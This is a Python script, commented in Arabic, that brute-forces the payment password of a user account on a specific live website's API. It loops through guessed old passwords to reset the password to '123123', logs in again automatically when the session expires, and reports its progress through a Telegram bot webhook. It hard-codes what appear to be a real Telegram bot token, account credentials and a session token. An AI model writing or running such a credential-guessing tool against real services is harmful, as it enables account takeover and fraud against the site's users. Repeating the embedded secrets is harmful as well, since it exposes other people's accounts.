import requests
import threading
import time
from flask import Flask, request

# بيانات تيليجرام
telegram_bot_token = "8063782826:AAEruWcAysxIgW4l9KpQCywotiWEa3YJuZI"
telegram_chat_id = "1701465279"

# بيانات تسجيل الدخول
login_data = {
    'username': '1281811280',
    'password': '123456',
    'lang': 'eg',
}

# متغيرات التقدم
progress = 0  # عدد كلمات المرور المجربة
is_running = True  # حالة البوت

# التوكن المستخدم في الطلبات
token = "02c8znoKfqx8sfRg0C0p1mQ64VVuoa7vMu+wgn1rttGH04eVulqXpX0SM9mF"

# رأس الطلبات (Headers)
headers = {
    'Content-Type': 'application/json',
    'User-Agent': 'PythonRequests',
    'Authorization': f'Bearer {token}',
}

# دالة تجربة كلمة المرور
def try_passwords():
    global progress, is_running, token

    while is_running:
        password = f"password-{progress + 1}"  # كلمة المرور التالية
        data = {
            'o_payword': password,
            'n_payword': '123123',
            'r_payword': '123123',
            'lang': 'eg',
            'token': token,
        }
        url = "https://btsmoa.btswork.vip/api/user/setuserinfo"
        try:
            response = requests.post(url, json=data, headers=headers)
            response_json = response.json()

            # تحديث التقدم
            progress += 1

            # إذا انتهت الجلسة، أعد تسجيل الدخول
            if response_json.get("code") in [203, 204]:
                relogin()

        except requests.exceptions.RequestException as e:
            print(f"⚠️ خطأ أثناء إرسال الطلب: {e}")
            time.sleep(5)

# دالة إعادة تسجيل الدخول
def relogin():
    global token
    print("🔄 إعادة تسجيل الدخول للحصول على توكن جديد...")
    try:
        response = requests.post('https://btsmoa.btswork.vip/api/User/Login', headers=headers, json=login_data)
        if response.status_code == 200:
            result = response.json()
            if "info" in result and "token" in result["info"]:
                token = result["info"]["token"]
                print(f"✅ تم الحصول على التوكن الجديد: {token}")
    except requests.exceptions.RequestException as e:
        print(f"⚠️ خطأ أثناء تسجيل الدخول: {e}")

# إعداد Flask للاستماع إلى أوامر تيليجرام
app = Flask(__name__)

@app.route(f"/{telegram_bot_token}", methods=["POST"])
def telegram_webhook():
    global progress
    data = request.get_json()

    # تأكد من أن الرسالة تحتوي على نص
    if "message" in data and "text" in data["message"]:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"]["text"]

        # عند استقبال أمر "ستارت"
        if text.lower() == "start":
            message = f"✅ البوت شغال! 🟢\nتم تجربة {progress} كلمة مرور حتى الآن."
            send_telegram_message(chat_id, message)

    return "OK", 200

# دالة إرسال رسالة تيليجرام
def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    data = {"chat_id": chat_id, "text": text}
    try:
        requests.post(url, json=data)
    except requests.exceptions.RequestException as e:
        print(f"⚠️ خطأ أثناء إرسال رسالة تيليجرام: {e}")

# بدء تجربة كلمات المرور في Thread منفصل
threading.Thread(target=try_passwords, daemon=True).start()

# تشغيل Flask
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
